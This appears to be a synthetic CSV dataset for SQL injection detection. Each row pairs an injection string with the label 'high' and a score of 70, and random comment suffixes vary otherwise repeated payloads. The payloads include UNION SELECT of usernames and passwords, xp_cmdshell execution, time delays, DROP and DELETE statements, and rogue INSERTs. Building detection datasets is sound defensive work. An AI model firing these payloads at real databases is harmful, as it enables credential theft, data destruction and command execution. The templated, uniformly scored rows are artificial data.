query,risk,score
' OR 1=1; INSERT INTO logs VALUES('hack') -- 9,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # x5,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 7,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- z",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
' OR 1=1; DROP TABLE temp; -- # w9,high,70
'; SELECT pg_sleep(5); -- -- 5,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
' OR 1=1; DROP TABLE temp; -- /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- f",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 1,high,70
'; WAITFOR DELAY '0:0:5'-- -- 4,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
'; DROP PROCEDURE admin_login-- # mz,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
'; SELECT pg_sleep(5); -- /**/,high,70
'; WAITFOR DELAY '0:0:5'-- # f5,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 62,high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # d3,high,70
"' UNION ALL SELECT username, password FROM users -- t",high,70
'; DROP PROCEDURE admin_login-- -- p,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 5r",high,70
'; DROP PROCEDURE admin_login-- -- 2,high,70
' OR 1=1; DROP TABLE temp; -- # yc,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # hs,high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
'; SELECT pg_sleep(5); -- # 6i,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # lp",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # uq,high,70
"' UNION ALL SELECT username, password FROM users -- 5",high,70
'; WAITFOR DELAY '0:0:5'-- # 7j,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 3,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- a",high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # nw",high,70
'; SELECT pg_sleep(5); -- -- d,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # d4,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- n,high,70
'; SELECT pg_sleep(5); -- -- 2,high,70
' OR 1=1; DROP TABLE temp; -- /**/,high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # tv,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- 9",high,70
"' UNION ALL SELECT username, password FROM users # t3",high,70
' OR SLEEP(5) AND '1'='1 # 78,high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- j,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # sl,high,70
'; DELETE FROM users; /**/ /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- w,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- s,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # y2",high,70
' OR 1=1; DROP TABLE temp; -- -- i,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # an",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # zl",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- e",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 3i",high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- n",high,70
'; DROP PROCEDURE admin_login-- -- j,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # lq,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- e",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- a",high,70
'; DROP PROCEDURE admin_login-- # iz,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
"' UNION ALL SELECT username, password FROM users # 1l",high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
'; DELETE FROM users; /**/ /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # e5,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- u,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- p",high,70
' OR SLEEP(5) AND '1'='1 # du,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 6",high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
' OR 1=1; DROP TABLE temp; -- /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 1o",high,70
' OR 1=1; DROP TABLE temp; -- # xj,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- t",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 52",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- u",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # s1",high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
'; DROP PROCEDURE admin_login-- -- r,high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
' OR 1=1; DROP TABLE temp; -- # oe,high,70
"' UNION ALL SELECT username, password FROM users # hf",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 4,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- 2",high,70
'; SELECT pg_sleep(5); -- # kh,high,70
'; SELECT pg_sleep(5); -- /**/,high,70
'; SELECT pg_sleep(5); -- # c3,high,70
